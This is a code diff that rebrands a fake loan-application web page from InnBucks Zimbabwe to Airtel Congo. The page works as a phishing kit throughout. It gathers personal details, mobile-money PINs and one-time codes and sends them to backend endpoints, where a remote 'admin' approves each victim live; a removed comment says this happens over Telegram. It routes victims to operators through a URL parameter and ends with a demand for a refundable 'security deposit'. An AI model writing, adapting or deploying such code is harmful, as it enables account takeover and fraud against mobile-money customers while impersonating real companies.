-  <div class="land-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="land-footer">© 2026 Airtel Congo</div>
 </div>
 
 <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
 <div id="page-step1" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Loan Application</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')">Home</div>
+  </header>
+
   <div class="step-center">
     <div class="step-card">
       <h2>Loan Application</h2>
@@ -307,11 +307,17 @@
 
 <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
 <div id="page-step2" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Loan Application</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-step1')">Back</div>
+  </header>
+
   <div class="step-center">
     <div class="step-card">
       <h2>Loan Application</h2>
@@ -325,8 +331,8 @@
       <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')"></div>
       <div class="field">
         <label>Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">Enter 9 digits or start with 0 (e.g., 0712345678 → auto-converts to 712345678)</div>
+        <div class="phone-row"><div class="ph-pre">+242</div><input type="tel" id="s2ph" placeholder="061234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="field-hint">Enter 9 digits for Congo</div>
       </div>
       <div class="step-btns">
         <button class="btn-gray" onclick="goTo('page-step1')">PREVIOUS</button>
@@ -334,16 +340,22 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="pg-footer">© 2026 Airtel Congo</div>
 </div>
 
 <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
 <div id="page-step3" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Loan Application</span>
+      </div>
+    </div>
+    <div class="brand-nav-right" onclick="goTo('page-step2')">Back</div>
+  </header>
+
   <div class="step-center">
     <div class="step-card">
       <h2>Loan Application</h2>
@@ -365,7 +377,7 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="pg-footer">© 2026 Airtel Congo</div>
 </div>
 
 <!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
@@ -373,30 +385,34 @@
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
     <h2>Loan Application Submitted</h2>
-    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to InnBucks.</p>
-    <div class="redir-pill">🔄 Redirecting to InnBucks login in <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Airtel Money.</p>
+    <div class="redir-pill">🔄 Redirecting to Airtel login in <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Go to Login Now</button>
   </div>
 </div>
 
 <!-- ══════════════════════ PAGE 6: LOGIN ══════════════════════ -->
 <div id="page-login" class="page">
-  <div class="login-hdr">
-    <div class="logo-group">
-      <div class="logo-dots" style="width:36px;height:36px;"><span class="dot-1" style="width:15px;height:15px;"></span><span class="dot-2" style="width:15px;height:15px;"></span><span class="dot-3" style="width:15px;height:15px;"></span><span class="dot-4" style="width:15px;height:15px;"></span></div>
-      <div class="logo-text" style="font-size:1.5rem;">InnBucks</div>
-      <div class="logo-sub">Quick &amp; Easy Loans</div>
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Secure Portal</span>
+      </div>
     </div>
-  </div>
+    <div class="brand-nav-right" onclick="goTo('page-landing')">Home</div>
+  </header>
+
   <div class="login-body-wrap">
-    <h2>Login</h2>
+    <h2>Account Login</h2>
     <div class="login-inner">
       <!-- Inline message for login errors -->
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇿🇼 +263</div>
-        <input type="tel" id="lgPh" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
+        <div class="lg-ph-pre">🇨🇬 +242</div>
+        <input type="tel" id="lgPh" placeholder="061234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
       <div class="pin-label">Enter your PIN (4 characters)</div>
       <div class="pin-row">
@@ -412,10 +428,9 @@
   </div>
   <div class="lg-curve">
     <div class="lg-foot">
-      <div class="logo-group">
-        <div class="logo-dots" style="width:32px;height:32px;"><span class="dot-1" style="width:13px;height:13px;"></span><span class="dot-2" style="width:13px;height:13px;"></span><span class="dot-3" style="width:13px;height:13px;"></span><span class="dot-4" style="width:13px;height:13px;"></span></div>
-        <div class="logo-text">InnBucks</div>
-        <div class="logo-sub">Quick &amp; Easy Loans</div>
+      <div class="brand-logo-area" style="justify-content:center;">
+        <div class="brand-logo-mark" style="background:#fff; color:var(--airtel-red); width:32px; height:32px; font-size:1rem;">a</div>
+        <span class="brand-title" style="color:#fff;">Airtel Congo</span>
       </div>
       <div class="lg-version">v2.1.3P</div>
       <div class="lg-terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
@@ -425,19 +440,22 @@
 
 <!-- ══════════════════════ PAGE 7: OTP ══════════════════════ -->
 <div id="page-otp" class="page">
-  <div class="otp-topbar">
-    <button class="bk" onclick="goTo('page-login')">←</button>
-    <div style="display:flex;align-items:center;gap:8px;">
-      <div class="logo-dots" style="width:22px;height:22px;"><span class="dot-1" style="width:9px;height:9px;"></span><span class="dot-2" style="width:9px;height:9px;"></span><span class="dot-3" style="width:9px;height:9px;"></span><span class="dot-4" style="width:9px;height:9px;"></span></div>
-      <div class="logo-text">InnBucks</div>
+  <header class="brand-header">
+    <div class="brand-logo-area">
+      <div class="brand-logo-mark">a</div>
+      <div class="brand-text-group">
+        <span class="brand-title">Airtel Congo</span>
+        <span class="brand-subtitle">Security Verification</span>
+      </div>
     </div>
-    <div class="hbg2"><span></span><span></span><span></span></div>
-  </div>
+    <div class="brand-nav-right" onclick="goTo('page-login')">Back</div>
+  </header>
+
   <div class="otp-body-wrap">
     <div class="otp-card">
       <h2>OTP Verification</h2>
       <p class="otp-hint">Enter the OTP sent to your phone number</p>
-      <div class="otp-phone" id="otpPh">+263712345678</div>
+      <div class="otp-phone" id="otpPh">+242061234567</div>
 
       <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -464,7 +482,7 @@
       </div>
     </div>
   </div>
-  <div class="otp-curve"><div class="otp-foot">© 2026 InnBucks Zimbabwe</div></div>
+  <div class="otp-curve"><div class="otp-foot">© 2026 Airtel Congo</div></div>
 </div>
 
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
@@ -478,13 +496,13 @@
     </div>
     <div class="comp-box">
       <div class="ch">⚠️ COMPLIANCE NOTICE</div>
-      <p>Your InnBucks account must be active and maintain a security deposit of at least <strong>10% of your requested loan amount.</strong> This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</p>
+      <p>Your Airtel account must be active and maintain a security deposit of at least <strong>10% of your requested loan amount.</strong> This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</p>
     </div>
     <div class="ld-card">
       <div class="ld-htitle">💳 Loan Details</div>
-      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.5</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-g">💵</div><div><div class="ld-lbl">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.50</div></div></div>
       <div class="ld-row"><div class="ld-icon ic-b">📅</div><div><div class="ld-lbl">LOAN TERM</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
-      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">INTEREST RATE</div><div class="ld-val">8% APR</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-p">📈</div><div><div class="ld-lbl">INTEREST RATE</div><div class="ld-val">12% APR</div></div></div>
     </div>
     <div class="qa-wrap">
       <div class="qa-title">Quick Actions</div>
@@ -519,22 +537,16 @@
     first: '',
     last: '',
     phone: '',
-    applicationId: null,   // set after /api/verify-pin
-    assignedAdminId: null  // set after /api/verify-pin
+    applicationId: null,   
+    assignedAdminId: null  
   };
 
-  // ── Admin ID capture from URL (same pattern as original system) ──
-  // ── Admin ID: ONLY from the current URL — never from storage.
-  // This guarantees customers from Link A go to Admin A, Link B to Admin B.
-  // If no ?admin= param, auto-assign on the server side.
   const _URL_ADMIN_ID = (() => {
     const params = new URLSearchParams(window.location.search);
     const id = params.get('admin');
-    // Clear any stale stored admin from previous sessions to prevent leakage
     sessionStorage.removeItem('selectedAdminId');
     localStorage.removeItem('selectedAdminId');
     if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      // Store only for this page session (OTP page reload safety)
       sessionStorage.setItem('selectedAdminId', id.trim());
       return id.trim();
     }
@@ -542,13 +554,11 @@
   })();
 
   function getAdminId() {
-    // Always prefer live URL param, then session-only fallback (same tab/session)
     const params = new URLSearchParams(window.location.search);
     const urlId  = params.get('admin');
     if (urlId && urlId !== 'undefined' && urlId !== 'null' && urlId.trim() !== '') {
       return urlId.trim();
     }
-    // sessionStorage fallback covers OTP page (same tab, no ?admin= in URL)
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
@@ -567,7 +577,7 @@
   function calcUp() {
     const a = +document.getElementById('rA').value;
     const t = +document.getElementById('rT').value;
-    const r = 0.25 / 12;
+    const r = 0.12 / 12;
     const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
     document.getElementById('aDisp').textContent = '$' + a.toLocaleString();
     document.getElementById('tDisp').textContent = t + ' months';
@@ -579,18 +589,15 @@
   // ══════════════════════════════════════════════════════
   // STEP NAVIGATION
   // ══════════════════════════════════════════════════════
-  // Normalize phone: strip leading 0 so +263 prefix works correctly
   function normalizePhone(id) {
     const el = document.getElementById(id);
     if (el.value.startsWith('0')) {
       const cursor = el.selectionStart;
       el.value = el.value.substring(1);
-      // Restore cursor position (minus the removed 0)
       el.setSelectionRange(Math.max(0, cursor - 1), Math.max(0, cursor - 1));
     }
   }
 
-  // Validation helpers
   function showErr(id, msg) {
     document.getElementById(id + 'Txt').textContent = msg;
     document.getElementById(id).classList.add('show');
@@ -636,7 +643,7 @@
       showErr('s2Err', 'Please enter a valid email address.'); shakeField('s2em'); return;
     }
     if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Please enter a valid 9-digit phone number.'); shakeField('s2ph'); return;
+      showErr('s2Err', 'Please enter a valid phone number.'); shakeField('s2ph'); return;
     }
     clearErr('s2Err');
     S.first = first; S.last = last; S.phone = phone;
@@ -647,7 +654,6 @@
     goTo('page-step3');
   }
 
-  // STEP 3: SUBMIT APPLICATION
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
@@ -655,12 +661,10 @@
     }
     clearErr('s3Err');
 
-    // Show spinner while "processing"
     const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
     if (btn) { btn.disabled = true; btn.textContent = 'SUBMITTING…'; }
     document.getElementById('mSubmit').classList.add('show');
 
-    // Simulate brief processing delay (1.5s) then navigate
     setTimeout(() => {
       document.getElementById('mSubmit').classList.remove('show');
       if (btn) { btn.disabled = false; btn.textContent = 'SUBMIT APPLICATION'; }
@@ -675,9 +679,6 @@
     }, 1500);
   }
 
-  // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
-  // ══════════════════════════════════════════════════════
   function showLoginMsg(text) {
     document.getElementById('lgMsgTxt').textContent = text;
     document.getElementById('lgMsg').classList.add('show');
@@ -687,7 +688,6 @@
   }
 
   function showOtpMsg(type, text) {
-    // Hide all first
     ['otpMsgErr','otpMsgOk','otpMsgWarn'].forEach(id => {
       document.getElementById(id).classList.remove('show');
     });
@@ -701,9 +701,6 @@
     });
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS
-  // ══════════════════════════════════════════════════════
   function pinMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
@@ -722,9 +719,6 @@
     });
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin (sends phone + PIN to Telegram admin)
-  // ══════════════════════════════════════════════════════
   async function doLogin() {
     hideLoginMsg();
 
@@ -736,10 +730,9 @@
       return;
     }
 
-    const phoneNumber = '+263' + rawPhone;
+    const phoneNumber = '+242' + rawPhone;
     const adminId = getAdminId();
 
-    // Show loading modal
     document.getElementById('mLogin').classList.add('show');
     document.getElementById('bLogin').disabled = true;
 
@@ -760,19 +753,15 @@
       document.getElementById('mLogin').classList.remove('show');
 
       if (data.success) {
-        // Store application ID for polling
         S.applicationId   = data.applicationId;
         S.assignedAdminId = data.assignedAdminId;
 
-        // Set phone display on OTP page
         document.getElementById('otpPh').textContent = phoneNumber;
 
-        // Transition to OTP page — but show "waiting for admin" first
         goTo('page-otp');
         document.getElementById('pinWait').classList.add('show');
         document.getElementById('otpInputSection').style.display = 'none';
 
-        // Start polling for PIN approval
         pollPinStatus();
 
       } else {
@@ -787,9 +776,6 @@
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status  (waiting for admin to tap ✅ or ❌)
-  // ══════════════════════════════════════════════════════
   let pinPollInterval = null;
 
   function pollPinStatus() {
@@ -804,7 +790,6 @@
 
         if (data.status === 'approved') {
           clearInterval(pinPollInterval);
-          // Hide waiting, show OTP input
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'block';
           showOtpMsg('success', 'Details verified! Please enter your OTP below.');
@@ -816,17 +801,12 @@
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'none';
           showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
-          // Re-enable login button in case user goes back
           document.getElementById('bLogin').disabled = false;
         }
-        // status === 'pending' → keep polling
 
-      } catch (e) {
-        // Silent — keep polling on network hiccup
-      }
+      } catch (e) {}
     }, 2000);
 
-    // Timeout after 5 minutes
     setTimeout(() => {
       if (pinPollInterval) {
         clearInterval(pinPollInterval);
@@ -838,9 +818,6 @@
     }, 300000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS
-  // ══════════════════════════════════════════════════════
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 5) document.getElementById('o' + (i+1)).focus();
@@ -850,14 +827,12 @@
 
   let _rsInterval = null;
   function startRs() {
-    // Clear any existing countdown first
     if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
 
     let s = 60;
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    // Always rebuild the span fresh so the ID exists
     rsBox.innerHTML = 'Resend code in <span id="rsS">' + s + '</span> seconds';
 
     _rsInterval = setInterval(() => {
@@ -868,14 +843,11 @@
         clearInterval(_rsInterval);
         _rsInterval = null;
         const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--teal);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+        if (box) box.innerHTML = '<span style="color:var(--airtel-red);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
       }
     }, 1000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP — calls /api/resend-otp
-  // ══════════════════════════════════════════════════════
   async function resendOtp() {
     if (!S.applicationId) return;
     try {
@@ -899,9 +871,6 @@
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
-  // ══════════════════════════════════════════════════════
   async function doOtp() {
     const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
     if (otp.length < 6) {
@@ -949,9 +918,6 @@
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
   let otpPollInterval = null;
 
   function pollOtpStatus() {
@@ -966,13 +932,11 @@
 
         if (data.status === 'approved') {
           clearInterval(otpPollInterval);
-          // Update approval page with loan details
           document.getElementById('apAmt').textContent  = '$' + Number(S.amt || 1000).toLocaleString();
           document.getElementById('apTerm').textContent = S.term || '48 Months';
-          // Calculate monthly payment for display
           const a = Number(S.amt) || 1000;
           const t = parseInt(S.term) || 48;
-          const r = 0.08 / 12;
+          const r = 0.12 / 12;
           const m = a * r * Math.pow(1+r,t) / (Math.pow(1+r,t) - 1);
           document.getElementById('apMthly').textContent = '$' + m.toFixed(2);
           goTo('page-approval');
@@ -983,35 +947,26 @@
           document.getElementById('bOtp').disabled = false;
 
         } else if (data.status === 'wrongpin_otp') {
-          // Admin flagged PIN as wrong — send user back to login
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
           setTimeout(() => {
-            // Clear PIN boxes
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
-            // Clear OTP boxes
             [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
-            // Reset OTP button
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
-            // Hide waiting spinner and show OTP inputs (reset OTP page state)
             document.getElementById('pinWait').classList.remove('show');
             document.getElementById('otpInputSection').style.display = '';
-            // Stop resend timer and reset it
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
-            // Clear all OTP messages
             hideOtpMsgs();
-            // Reset application state so a fresh login creates a new application
             S.applicationId = null;
             S.assignedAdminId = null;
             goTo('page-login');
           }, 2500);
 
         } else if (data.status === 'wrongcode') {
-          // Admin flagged OTP as wrong — let user re-enter
           clearInterval(otpPollInterval);
           [0,1,2,3,4,5].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
@@ -1019,14 +974,10 @@
           showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
           document.getElementById('o0').focus();
         }
-        // status === 'pending' → keep polling
 
-      } catch (e) {
-        // Silent on network hiccup
-      }
+      } catch (e) {}
     }, 2000);
 
-    // 5 minute timeout
     setTimeout(() => {
       if (otpPollInterval) {
         clearInterval(otpPollInterval);
@@ -1036,9 +987,6 @@
     }, 300000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // INIT
-  // ══════════════════════════════════════════════════════
   calcUp();
 </script>
 </body>
